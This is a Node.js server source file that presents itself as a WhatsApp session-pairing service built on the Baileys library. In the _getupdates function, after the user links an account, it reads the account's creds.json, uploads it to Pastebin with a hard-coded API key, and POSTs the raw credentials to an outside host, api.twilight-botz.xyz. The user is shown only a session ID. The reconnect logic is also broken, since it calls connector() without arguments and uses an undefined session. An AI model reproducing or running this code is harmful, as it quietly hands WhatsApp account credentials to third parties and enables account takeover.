const express = require("express");
const fs = require("fs-extra");
const pino = require("pino");
const axios = require("axios");
const NodeCache = require("node-cache");
const { Mutex } = require("async-mutex");
const PastebinAPI = require("pastebin-js");
const path = require("path");
const {
    default: makeWASocket,
    useMultiFileAuthState,
    delay,
    Browsers,
    makeCacheableSignalKeyStore,
    DisconnectReason,
} = require("@whiskeysockets/baileys");
const pastebin = new PastebinAPI("EMWTMkQAVfJa9kM-MRUrxd5Oku1U7pgL");
const app = express();
const port = process.env.PORT || 3000;
const msgRetryCounterCache = new NodeCache();
const mutex = new Mutex();
const logger = pino({ level: "info" });
const cleanSessionDir = async () => {
    const sessionDir = path.join(__dirname, "session");
    if (fs.existsSync(sessionDir)) {
        await fs.emptyDir(sessionDir);
        await fs.remove(sessionDir);
    }
};

app.use(express.static(path.join(__dirname, "pages")));
app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "pages", "dashboard.html"));
});

app.get("/pair", async (req, res) => {
    const Num = req.query.code;
    if (!Num) {
        return res.status(400).json({ message: "Phone number is required" }); }
    const release = await mutex.acquire();
    try {
        await cleanSessionDir();
        await connector(Num, res);
    } catch (error) {
        logger.error(error);
        res.status(500).json({ error: "Server Error" });
        await cleanSessionDir();
    } finally {
        release();
    }
});

async function connector(Num, res) {
    const sessionDir = path.join(__dirname, "session");
    await fs.ensureDir(sessionDir);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const session = makeWASocket({
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, logger),
        },
        printQRInTerminal: false,
        logger,
        browser: Browsers.macOS("Safari"),
        markOnlineOnConnect: true,
        msgRetryCounterCache,
    });
    if (!session.authState.creds.registered) {
        await delay(1500);
        Num = Num.replace(/[^0-9]/g, "");
        const code = await session.requestPairingCode(Num);
        if (!res.headersSent) {
            res.json({ code: code?.match(/.{1,4}/g)?.join("-") });
        }
    }
    session.ev.on("creds.update", async () => {
        await saveCreds();
    });
    session.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect } = update;
        if (connection == "open") {
            logger.info("Connected successfully");
            await _getupdates(session);
        } else if (connection == "close") {
            const reason = lastDisconnect?.error?.output?.statusCode;
            logger.warn(`Connection closed. Reason: ${reason}`);
            reconn(reason);
        }
    });
}

async function _getupdates(session) {
    try {
        const cx_l = path.join(__dirname, "session", "creds.json");
        const data = await fs.readFileSync(cx_l, "utf-8");
        const paste_db = await pastebin.createPasteFromFile(cx_l,"naxordev",null,1,"N");
        const unique = paste_db.split("/")[3];
        const x_key = `${unique}-${Date.now()}-${Math.random().toString(36).substring(2, 15)}`;
        const id_session = Buffer.from(x_key).toString("base64");
        const response = await axios.post("https://api.twilight-botz.xyz/paste", {
            SessionID: id_session,
            creds: data,
        });
        logger.info(response.data);
        await session.sendMessage(session.user.id, {
            text: "Naxor~" + id_session,
        });
        await session.sendMessage(session.user.id, {
            text: "X-Astrl dont share your session_id",
        });
        logger.info("[Session]_online_");
        await cleanSessionDir();
    } catch (error) {
        logger.error(error);
    }
}

function reconn(reason) {
    if (
        [
            DisconnectReason.connectionLost,
            DisconnectReason.connectionClosed,
            DisconnectReason.restartRequired,
        ].includes(reason)
    ) {
        logger.info("Connection lost, reconnecting...");
        connector();
    } else {
        logger.error(`Disconnected! Reason: ${reason}`);
        session.end();
    }
}

app.listen(port, () => {
    logger.info(`Server running on http://localhost:${port}`);
});
    
